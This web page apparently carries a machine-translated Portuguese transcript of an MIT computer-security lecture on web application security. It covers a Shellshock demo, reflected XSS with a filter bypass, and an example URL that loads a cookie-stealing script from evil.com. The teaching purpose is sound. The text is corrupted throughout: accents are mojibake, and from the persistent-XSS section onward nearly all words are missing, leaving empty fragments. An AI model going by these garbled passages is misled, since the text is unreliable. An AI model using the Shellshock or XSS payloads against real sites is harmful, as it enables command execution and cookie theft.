<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üë®‚Äçüéì ‚úçüèΩ üéÉ Curso MIT "Seguran√ßa de sistemas de computadores". Aula 9: Seguran√ßa de Aplicativos Web, Parte 1 üå∂Ô∏è üßíüèª üç∞</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Instituto de Tecnologia de Massachusetts. Curso de Aula n¬∫ 6.858. "Seguran√ßa de sistemas de computador". Nikolai Zeldovich, James Mickens. 2014 ano 
 ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Curso MIT "Seguran√ßa de sistemas de computadores". Aula 9: Seguran√ßa de Aplicativos Web, Parte 1</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/ua-hosting/blog/424289/"><h3>  Instituto de Tecnologia de Massachusetts.  Curso de Aula n¬∫ 6.858.  "Seguran√ßa de sistemas de computador".  Nikolai Zeldovich, James Mickens.  2014 ano </h3><br>  Computer Systems Security √© um curso sobre o desenvolvimento e implementa√ß√£o de sistemas de computador seguros.  As palestras abrangem modelos de amea√ßas, ataques que comprometem a seguran√ßa e t√©cnicas de seguran√ßa baseadas em trabalhos cient√≠ficos recentes.  Os t√≥picos incluem seguran√ßa do sistema operacional (SO), recursos, gerenciamento de fluxo de informa√ß√µes, seguran√ßa de idiomas, protocolos de rede, seguran√ßa de hardware e seguran√ßa de aplicativos da web. <br><br>  Palestra 1: ‚ÄúIntrodu√ß√£o: modelos de amea√ßas‚Äù <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 3</a> <br>  Palestra 2: ‚ÄúControle de ataques de hackers‚Äù <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 3</a> <br>  Aula 3: ‚ÄúEstouros de Buffer: Explora√ß√µes e Prote√ß√£o‚Äù <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 3</a> <br>  Palestra 4: ‚ÄúSepara√ß√£o de Privil√©gios‚Äù <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 3</a> <br>  Palestra 5: ‚ÄúDe onde v√™m os sistemas de seguran√ßa?‚Äù <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 2</a> <br>  Palestra 6: ‚ÄúOportunidades‚Äù <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 3</a> <br>  Palestra 7: ‚ÄúSandbox do Cliente Nativo‚Äù <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 3</a> <br>  Aula 8: ‚ÄúModelo de Seguran√ßa de Rede‚Äù <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 3</a> <br>  Aula 9: ‚ÄúSeguran√ßa de aplicativos da Web‚Äù <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 3</a> <a name="habracut"></a><br><br>  Vamos come√ßar a segunda palestra em nossa impressionante s√©rie de hist√≥rias de seguran√ßa na web.  Gostaria de proceder imediatamente a uma r√°pida demonstra√ß√£o de exemplos, pois voc√™ sabe que nossas demos quase nunca funcionam.  Espero que voc√™ n√£o veja uma tela em branco hoje. <br><br>  A id√©ia b√°sica √© que primeiro gostaria de mostrar um exemplo de erro do Shellshock sobre o qual voc√™ j√° deve ter ouvido falar.  Este foi um t√≥pico bastante popular na literatura sobre seguran√ßa de computadores. <br><br><img src="https://habrastorage.org/webt/kk/h0/hz/kkh0hzlvc4krqxabzmnwigajxo4.jpeg"><br><br>  As pessoas atribuem a um erro Heartbleed uma classifica√ß√£o m√°xima de 10 em uma escala de perigo 10. Eles consideram esse o erro mais perigoso que o sistema de seguran√ßa deve proteger.  Eu pensei que seria uma √≥tima id√©ia mostrar a voc√™ uma hist√≥ria viva desse problema que voc√™ pode recontar para seus pais para que eles entendam que estudar no Instituto de Tecnologia de Massachusetts vale a pena. <br><br>  Ent√£o, qual √© a principal id√©ia do erro do Shellshock?  Este √© realmente um excelente exemplo de por que √© t√£o dif√≠cil criar aplicativos da Web seguros que abranjam v√°rias tecnologias, v√°rios idiomas, v√°rios sistemas operacionais e assim por diante.  Portanto, a id√©ia principal √© que o Shellshock use o fato de que um invasor pode criar uma solicita√ß√£o http especial para o servidor e gerenciar os cabe√ßalhos dessa solicita√ß√£o.  Eu escrevi um exemplo muito simples no quadro. <br>  Suponha que um invasor queira enviar uma solicita√ß√£o GET para algum CGI sobre o t√≥pico de procurar gatos, porque √© exatamente isso que as pessoas sempre procuram na Internet (apenas brincando).  Portanto, haver√° um ponto de interroga√ß√£o e algum tipo de cabe√ßalho de host padr√£o com um URL, por exemplo, example.com: <br><br>  GET /querry.cgi?  search = gatos <br>  Anfitri√£o: example.com <br>  Personalizado - cabe√ßalho: Personalizado - valor <br><br>  Agora observe que um invasor tamb√©m pode especificar cabe√ßalhos personalizados.  Por exemplo, eu quero encontrar algum tipo de cabe√ßalho espec√≠fico de aplicativo chamado Custom-header para indicar algum valor personalizado, porque o aplicativo Web pode definir algumas funcionalidades que n√£o podem ser expressas usando cabe√ßalhos HTTP predefinidos simples.  Ent√£o, enquanto tudo isso parece bastante inofensivo. <br>  Mas, no final, o que acontece √© que muitos desses servidores da Web para processar scripts CGI realmente aceitam esses valores customizados no cabe√ßalho Custom-value e os utilizam para definir vari√°veis ‚Äã‚Äãde ambiente Bash.  Ou seja, eles usar√£o esse cabe√ßalho personalizado para criar um cabe√ßalho personalizado para o nome da vari√°vel Bash, pegar√£o esse valor personalizado fornecido pelo atacante e o usar√£o como o valor da vari√°vel Bash.  Uma vez que essa vari√°vel √© definida, o servidor CGI far√° algum processamento do contexto desse ambiente. <br><br>  E isso √© ruim porque os servidores da Web n√£o devem receber valores arbitr√°rios dessas coisas "sujas" aleat√≥rias.  Assim, em um exemplo espec√≠fico de erro do Shellshock, o que acontece √© que, se voc√™ atribuir √† vari√°vel Bash algum valor malicioso, uma forma de loucura pode come√ßar. <br><br><img src="https://habrastorage.org/webt/pt/e_/26/pte_26a2d3abmngljp3z9rwoiwa.jpeg"><br><br>  Basicamente, essa defini√ß√£o maliciosa de uma fun√ß√£o √© escolhida na linguagem de script Bash e voc√™ n√£o deve se incomodar com as especificidades deste processo.  Mas o fato √© que, se o par√¢metro Bash fosse definido corretamente, essa parte do / bin / id n√£o seria executada.  Ent√£o voc√™ acabou de definir algum tipo de fun√ß√£o burra que n√£o faz nada e encerra o processo de consulta. <br><br>  No entanto, essa sequ√™ncia de caracteres confunde o analisador Bash; parece trope√ßar nesse absurdo localizado ap√≥s a barra.  E ent√£o ele diz: ‚ÄúAh, eu poderia continuar analisando e executando alguns comandos aqui, certo?‚Äù  E, nesse caso, ele simplesmente executa o comando bin / id, que exibe algumas informa√ß√µes sobre o usu√°rio.  Mas a ess√™ncia da vulnerabilidade √© que, em vez de bin / id, voc√™ pode colocar absolutamente qualquer c√≥digo aqui! <br><br>  Vou dar um exemplo muito simples que voc√™ ver√° na tela.  Este √© um servidor Python muito simples, o mais f√°cil que voc√™ pode imaginar.  Eu uso o m√©todo GET aqui.  Esse m√©todo significa iterar sobre todos os cabe√ßalhos HTTP na solicita√ß√£o. <br><br><img src="https://habrastorage.org/webt/w4/3c/fw/w43cfwwaqjmmjxm78zug-oecus4.jpeg"><br><br><img src="https://habrastorage.org/webt/1m/mr/jf/1mmrjfhbdbu6-kpevbe24bsmhpg.jpeg"><br><br>  Aqui no cabe√ßalho, temos um valor para a vari√°vel K e um valor para a consulta V. Nesse caso, GET simplesmente imprime os cabe√ßalhos que encontra. <br><br>  E ent√£o ele far√° algo muito est√∫pido - fazer uma chamada do sistema e definir o valor do shell diretamente para o valor indicado no cabe√ßalho.  Portanto, essa √© toda a raiz da vulnerabilidade. <br><br>  Se eu for para a pr√≥xima guia e iniciar o servidor da v√≠tima, veremos que ele est√° pronto para aceitar solicita√ß√µes. <br><br><img src="https://habrastorage.org/webt/rk/jt/zg/rkjtzg52m6abnpspbgoyltcpzmc.jpeg"><br><br>  Ent√£o eu posso escrever meu cliente Shellshock especial - ele est√° localizado na pr√≥xima guia. <br><br><img src="https://habrastorage.org/webt/jv/jh/hc/jvjhhchuelxbtmdnkrdos_apl_0.jpeg"><br><br>  Na verdade, √© bem simples - eu apenas defino uma dessas linhas maliciosas de attack.str, para que ele tenha esses valores "curvos".  E ent√£o eu sei que no lado do servidor tudo ser√° feito agora de acordo com a minha vontade. <br><br>  Nesse caso, usei algo inofensivo - eco "Eu possuo seu carro".  Mas poderia haver qualquer coisa.  Voc√™ pode executar outro shell Bash com o par√¢metro "echo ATTACKER CMD", ou seja, o comando do invasor real, que pode ser muito perigoso. <br><br>  Ent√£o, defino os cabe√ßalhos e a solicita√ß√£o do usu√°rio e, em seguida, basta usar o Python para criar uma conex√£o HTTP e envi√°-la ao servidor.  Ent√£o, o que acontece no final?  Estou executando meu cliente Shellshock aqui. <br><br><img src="https://habrastorage.org/webt/li/y5/pf/liy5pfnb9rji1s51vi7vvwwn4bs.jpeg"><br><br>  Veja, o erro 404 apareceu aqui, porque n√£o importa qual arquivo solicitei, apenas insiro aqui algum tipo de √≠ndice que n√£o existe HTML.  Mas se voc√™ olhar aqui, na segunda guia, onde mostramos o servidor Web da v√≠tima que concordou em se conectar pela porta 8282, veremos que ele recebeu minhas mensagens "Eu sou o seu carro" e o ATTACKER CMD. <br><br><img src="https://habrastorage.org/webt/6t/kf/yp/6tkfyptepbhu83ggs2shp_20dys.jpeg"><br><br>  Como assim que o servidor da v√≠tima recebeu esse cabe√ßalho, ele definiu imediatamente os valores da vari√°vel Bash e, como resultado, o comando ATTACKER CMD foi iniciado.  Isso est√° claro? <br><br>  <b>P√∫blico:</b> isso acontece se um programa come√ßa com esse t√≠tulo? <br><br>  <b>Professor:</b> sim.  Portanto, as especificidades de como o ataque funciona depende da apar√™ncia do servidor da web, por exemplo, se voc√™ trabalha com Apache ou n√£o.  Este exemplo √© um pouco exagerado, j√° que criei outro shell Bash, defini uma vari√°vel de shell e s√≥ ent√£o iniciei o processo.  Mas voc√™ pode imaginar que, se voc√™ criou outros processos para cada conex√£o de entrada, poder√° definir a vari√°vel de ambiente diretamente. <br><br>  <b>P√∫blico-alvo:</b> portanto, se voc√™ retornar ao c√≥digo do servidor da Web, parece que h√° uma vulnerabilidade muito pior que o Shellshock.  Como voc√™ pode fazer uma chamada do sistema e executar o comando simplesmente configurando o cabe√ßalho personalizado para outra coisa, eu n√£o precisaria usar o erro Shellshock neste exemplo. <br><br>  <b>Professor:</b> sim, est√° certo, neste servidor Web particular, que escrevi apenas como exemplo, h√° algo que n√£o pode ser confi√°vel para nada.  Mas se aqui n√£o tiv√©ssemos Python, mas Apache, poder√≠amos definir diretamente o valor do ambiente para qualquer servi√ßo espec√≠fico usando o par√¢metro set nth.  Mas existem servidores como este que criam um processo separado e fazem algo muito semelhante ao exemplo dado. <br><br><img src="https://habrastorage.org/webt/js/s4/zz/jss4zz4vwyw6dqz-4s0kzwlr-uy.jpeg"><br><br>  Outro exemplo que eu queria dar √© o exemplo de script entre sites.  O bug do Shellshock foi um exemplo de qu√£o importante √© a desinfec√ß√£o do conte√∫do.  Discutimos o fato de que voc√™ n√£o deve apenas aceitar informa√ß√µes de pessoas aleat√≥rias e us√°-las diretamente em equipes de qualquer tipo. <br><br>  O script entre sites √© outro exemplo que mostra por que algo pode dar errado.  Neste exemplo, eu tenho outro servidor CGI simples escrito em Python. <br><br><img src="https://habrastorage.org/webt/lp/oo/aw/lpooaw-togbyuns6zaxta0lp6ei.jpeg"><br><br>  Este √© o identificador que √© executado quando uma solicita√ß√£o √© recebida do cliente.  Imprimi alguns cabe√ßalhos aqui para a resposta, e minha resposta ser√° texto HTML.  Acontece que os navegadores t√™m alguns mecanismos de seguran√ßa para tentar impedir o ataque que eu vou lhe mostrar.  Portanto, tornei poss√≠vel desativar alguns dos mecanismos dessa prote√ß√£o colocando essa barra de t√≠tulo no in√≠cio. <br><br>  O script CGI obt√©m acesso a todos os campos e solicita√ß√µes CGI, come√ßando com a linha form = cgi.FieldStorage ().  Imagine que tudo o que est√° localizado na linha ap√≥s este ponto de interroga√ß√£o representa o t√≠tulo e os par√¢metros do nosso exemplo: <br><br>  GET /querry.cgi?  search = gatos <br>  Anfitri√£o: example.com <br>  Personalizado - cabe√ßalho: Personalizado - valor <br><br>  Em seguida, o script cgi faz uma coisa muito simples - imprime imediatamente o valor de algo que veio do invasor.  Essa √© a mesma id√©ia b√°sica, e √© uma p√©ssima id√©ia, porque esta fun√ß√£o de impress√£o imprime o valor resultante diretamente no pr√≥prio HTML. <br><br>  Aqui pode acontecer o seguinte.  Suponha que eu tenha v√°rias consultas que quero executar.  Nesta primeira solicita√ß√£o, simplesmente defino o valor da mensagem como Hello, ou seja, vou para o endere√ßo da primeira linha. <br><br><img src="https://habrastorage.org/webt/q2/xl/ng/q2xlngmnjiyfdvdytmh2gfdoymq.jpeg"><br><br>  Portanto, se eu for para a minha p√°gina, verei a palavra hello nela, porque o servidor aceita diretamente o que eu transmito e imprime ‚Äúhello‚Äù.  Portanto, sem surpresas. <br><br><img src="https://habrastorage.org/webt/1t/0n/ak/1t0nakmsjq1emmcqj03bs9sosq0.jpeg"><br><br>  Entendo que posso realmente passar c√≥digo HTML arbitr√°rio l√° e, se eu definir o formato do cabe√ßalho como h1, ou seja, enviarei a segunda linha que termina em ol√° para o servidor, ela tamb√©m ser√° alterada na p√°gina - veja, o estilo da palavra mudou para o estilo do cabe√ßalho h1.  Por isso, digite os valores diretamente na p√°gina. <br><br><img src="https://habrastorage.org/webt/gm/qy/mv/gmqymv3fbxpjzkxa5wwdvijx7vu.jpeg"><br><br>  √ìtimo, agora estamos no neg√≥cio, e isso √© legal.  Agora, basta adicionar o c√≥digo JavaScript, ou seja, executaremos a terceira linha preparada por mim no navegador, onde um determinado script √© inserido, executado ap√≥s o par√¢metro de alerta ("XSS"). <br><br>  Ent√£o agora vemos uma tela em branco.  Parece que n√£o obtivemos √™xito, porque nenhuma sa√≠da √© vis√≠vel e n√£o notei nenhum aviso. <br><br><img src="https://habrastorage.org/webt/hd/mo/qr/hdmoqr8xk5ehtmumjddzqwrquns.jpeg"><br><br>  Mas se eu olhar a sa√≠da do servidor da Web, verei que o pr√≥prio servidor da Web n√£o recebeu realmente essa tag de script final.  Parece que o pr√≥prio navegador de alguma forma detectou algo ruim, embora eu tenha tentado desativar o filtro XSS.  Ent√£o √© bem interessante.  Mais tarde, examinaremos mais de perto esse mecanismo de prote√ß√£o, mas, por enquanto, observarei que o navegador est√° tentando suportar ataques de script entre sites. <br><br>  Mas voc√™ pode aproveitar o fato de que HTML, CSS e JavaScript s√£o linguagens extremamente complexas e s√£o escritos de uma maneira dif√≠cil de entender.  Aproveitarei isso e utilizarei a √∫ltima quarta linha da minha entrada, colocando-a na barra de endere√ßos do navegador.  Esta √© uma sequ√™ncia de ataques que cont√©m um URL inv√°lido.  Ele inclui o URL da imagem &lt;IMG "" "&gt; e a tag de script"&gt; e, na verdade, n√£o pode ser analisado.  Portanto, ap√≥s o recebimento dessa linha, o navegador simplesmente fica confuso e exibe informa√ß√µes na tela: ‚ÄúA p√°gina em 127.0.0.1:8282 diz: XSS‚Äù.  Portanto, a detec√ß√£o de script entre sites incorporada n√£o funciona realmente. <br><br><img src="https://habrastorage.org/webt/zh/sa/df/zhsadfxqyr1nqiwiy8atytitmou.jpeg"><br><br>  Se clicarmos no bot√£o "OK", teremos apenas uma p√°gina em branco.  Mas se voc√™ olhar para o seu conte√∫do, veremos aspas e colchetes incompreens√≠veis que v√™m do nada. <br><br><img src="https://habrastorage.org/webt/za/qi/yp/zaqiyp6lxm9damgqbidbi7ess3u.jpeg"><br><br>  No entanto, do ponto de vista do invasor, a p√°gina danificada n√£o importa, porque vimos um aviso, o que significa que o c√≥digo foi iniciado.  E poderia ser usado para roubar cookies ou fazer algo assim. <br><br>  <b>P√∫blico:</b> qual √© o aspecto entre sites? <br><br>  <b>Professor: O</b> aspecto entre sites √© que, se um invasor pode convencer um usu√°rio a acessar um URL, como neste exemplo, ele √© a pessoa que determina o conte√∫do da mensagem.  √â ele quem cria o aviso XSS ou algo assim.  Essencialmente, o que acontece √© que a p√°gina da v√≠tima executa o c√≥digo em nome de algu√©m que n√£o gerencia essa p√°gina. <br><br>  Ent√£o, mostrei duas demonstra√ß√µes r√°pidas do mundo "sujo" em que vivemos.  Ent√£o, por que o script entre sites √© t√£o comum?  Por que essas quest√µes s√£o t√£o importantes?  O motivo √© que os sites est√£o se tornando cada vez mais din√¢micos e desejam hospedar v√°rios conte√∫dos gerados por usu√°rios ou incluir conte√∫do de outros dom√≠nios.  Pense, por exemplo, na se√ß√£o de coment√°rios de um artigo de not√≠cias; esses coment√°rios s√£o de pessoas n√£o confi√°veis ‚Äã‚Äã- de usu√°rios.  De uma forma ou de outra, esses sites devem descobrir quais s√£o as regras para combinar essas coisas. <br><br>  Os sites podem conter documentos do usu√°rio, como documentos do Google ou do Office 365. Todos esses documentos s√£o de pessoas n√£o confi√°veis, mas de alguma forma precisam se dar bem e com a √≥tima infraestrutura do Google ou da Microsoft. <br><br>  Que tipos de cen√°rios de seguran√ßa entre sites podemos usar?  Um tipo de prote√ß√£o s√£o os filtros de script entre sites no pr√≥prio navegador.  Esses filtros tentar√£o detectar poss√≠veis ataques de script entre sites.  E vimos um desses filtros em a√ß√£o - este foi o terceiro exemplo do cen√°rio que examinamos. <br>  Suponha que voc√™ tenha o URL <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">foo.com/?q=</a> &lt;script src = "evil.com/cookie stealer.js"&gt;.  Ou seja, esse endere√ßo executa um script que redireciona o usu√°rio para um site malicioso e rouba cookies dele. <br><br><img src="https://habrastorage.org/webt/no/hf/b_/nohfb_nyupptbxwj4luk1whqgpw.jpeg"><br><br>  Portanto, o navegador se recusar√° a execut√°-lo e o truque desse invasor n√£o funcionar√°.  O motivo √© simples - o navegador apenas verificou se havia uma <code>&lt;script&gt;</code> nesse URL e, ap√≥s encontr√°-la, proibiu o clique neste link.  Portanto, essa √© uma heur√≠stica muito simples para descobrir se algo nocivo est√° acontecendo, porque nenhum desenvolvedor normal colocar√° essas coisas no endere√ßo.  Voc√™ pode configurar as op√ß√µes de configura√ß√£o do navegador para ativar ou desativar essas coisas.  √Äs vezes, isso √© √∫til para testar se voc√™ deseja apenas rapidamente e sem muita verifica√ß√£o inserir alguns dados JavaScript.  Mas geralmente essa verifica√ß√£o no navegador √© ativada por padr√£o. <br><br>  Por exemplo, o Chrome e o IE t√™m um filtro interno que analisa o valor do URL na barra de endere√ßos e procura coisas semelhantes.  E se eles estiverem l√°, o navegador poder√° tentar remov√™-los completamente ou tornar a fonte dentro de &lt;&gt; vazia.  Existem muitos m√©todos de an√°lise heur√≠stica com base nos quais os navegadores devem detectar essas coisas.  E se voc√™ olhar o site da OWASP, h√° exemplos de como usar essa heur√≠stica para detectar scripts entre sites e exemplos de como ignorar esse filtro. <br><br>  Sabe, foi muito engra√ßado, porque a princ√≠pio, como exemplo para nossa palestra, fiz algo semelhante a isso, e n√£o funcionou.  Ent√£o eu olhei para a folha de dicas da OWASP e encontrei a quarta op√ß√£o que funcionava: era um exemplo com uma an√°lise quebrada do endere√ßo da imagem img. <br><br>  Portanto, o principal problema, que n√£o permite que voc√™ simplesmente confie nos filtros internos do navegador, √© que existem muitas maneiras diferentes de for√ßar os analisadores de CSS e HTML a analisar algum conte√∫do da maneira errada.  Portanto, as solu√ß√µes incorporadas n√£o s√£o perfeitas, elas n√£o cobrem todas as vulnerabilidades. <br><br>  <b>P√∫blico:</b> Mas n√£o √© responsabilidade do navegador verificar essas coisas? <br><br>  <b>Professor:</b> Quero dizer o caso em que o navegador est√° em um servidor proxy e o proxy faz algo mostrado neste exemplo.  Ou seja, os filtros internos fazem sentido, porque pode haver muitos analisadores dentro do navegador, e esses filtros s√£o usados ‚Äã‚Äãpara proteger as camadas do manipulador dentro do navegador. <br><br>  <b>P√∫blico:</b> Acho que podemos dizer que √© responsabilidade do desenvolvedor da web, n√£o do usu√°rio, verificar essas coisas. <br><br>  <b>Professor:</b> em certo sentido, poder√≠amos dizer que no Unix ou Windows tamb√©m existem processos que o desenvolvedor de software, e n√£o o usu√°rio, deve cuidar, e o desenvolvedor deve garantir que essas coisas permane√ßam isoladas.  Mas, na realidade, o sistema operacional e o hardware tamb√©m desempenham um papel importante, porque, do contr√°rio, n√£o se pode confiar em nenhum programa feito por desenvolvedores aleat√≥rios.  Mas basicamente voc√™ est√° certo.  De fato, estruturas como o Django ou algo semelhante est√£o tentando ajud√°-lo a solucionar alguns desses problemas. <br><br>  De uma forma ou de outra, os filtros n√£o s√£o uma solu√ß√£o ideal e n√£o podem impedir o que √© conhecido como persistente, ou ataques persistentes de script entre sites, XSS persistente.  Este √© um tipo de reflex√£o, porque o c√≥digo do script simplesmente "vive" na URL.  Assim que o usu√°rio fechou esse URL, o ataque terminou. <br><br>  Mas imagine que um usu√°rio tenha colocado HTML malicioso na se√ß√£o de coment√°rios do seu site.         ,          .           ,      . <br><br><img src="https://habrastorage.org/webt/ve/bq/zh/vebqzhebjjzb__fbvhmhga2tav0.jpeg"><br><br>  ,     ‚Äì   .           HTML-   . <br><br>    ?  - ,          .        HTML,   ,       .         . <br><br> <b>:</b>  ,    , ,  ,           -   ? <br><br> <b>:</b>    ,      .   ,     ‚Äî post.  ,   ,   XML HTTP . <br><br> <b>:</b>      ,          ,  ‚Ä¶ <br><br> <b>:</b> ,     ,      .  ,                 .      - ,    . <br><br>  ,    ,         . <br><br>       ,   ¬´ HTTP ¬ª,  HTTP-only cookie.     ,     ,    JavaScript        cookie.  ,  ,          , : ¬´,    ,  JavaScript,     cookie¬ª!         - . <br><br>     ,        ,    .     ,      .  ,    JavaScript     cookie,     - , ,  URL-  -   , , buy.com.      ,   , ,  Ferrari,        attacker,    . <br><br><img src="https://habrastorage.org/webt/3q/nz/v2/3qnzv2vakvuorhnvqzgzonxubvw.jpeg"><br><br>    ,  JavaScript,      cookie,  ,       URL-.  ,     CSRF ,      . <br><br>   ,     ,      ,   .    ,         ,    . ,  -   ,   ,     ,  Google, Office 365   .         . , Google              googleusercontent.com.      ,  Gmail   . -,      25-   . <br><br><img src="https://habrastorage.org/webt/xz/b0/r7/xzb0r7kx8ebddto0pynf4cuoyn4.jpeg"><br><br>       ?  ,          -     ,              google.com.     ,              google.com.          . <br><br>  ,     ‚Äì     .   ,       -,    ,     .       ,                 .   ‚Äî   Django.   -, ,          -. <br><br><img src="https://habrastorage.org/webt/hh/tk/em/hhtkemhitqft99764mtwlvwzssi.jpeg"><br><br> Django     ,      ,           .          ‚Äì   .             CSS   ,       . ,        .  Django    ,    :   ,   . <br><br><img src="https://habrastorage.org/webt/m7/t-/tt/m7t-tthgw-nmrsbhzx0z0r_8wwi.jpeg"><br><br>    -.    ,       Django,  Django : ¬´,     -, ,  ,    CGI¬ª.    Django     ,       ,     .  -   CGI0,    ,         . <br><br>  Django    ‚Äì     ,      .         name,     ,          HTML    JavaScript  -   . <br><br> 26:25  <br><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Curso MIT "Seguran√ßa de sistemas de computadores".</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Aula 9: ‚ÄúSeguran√ßa de aplicativos da Web‚Äù, parte 2</a> <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/6HhmIlbE0l0" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  A vers√£o completa do curso est√° dispon√≠vel <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">aqui</a> . <br><br>  Obrigado por ficar conosco.  Voc√™ gosta dos nossos artigos?  Deseja ver materiais mais interessantes?  Ajude-nos fazendo um pedido ou recomendando a seus amigos, um <b>desconto de 30% para os usu√°rios da Habr em um an√°logo exclusivo de servidores b√°sicos que inventamos para voc√™:</b> <a 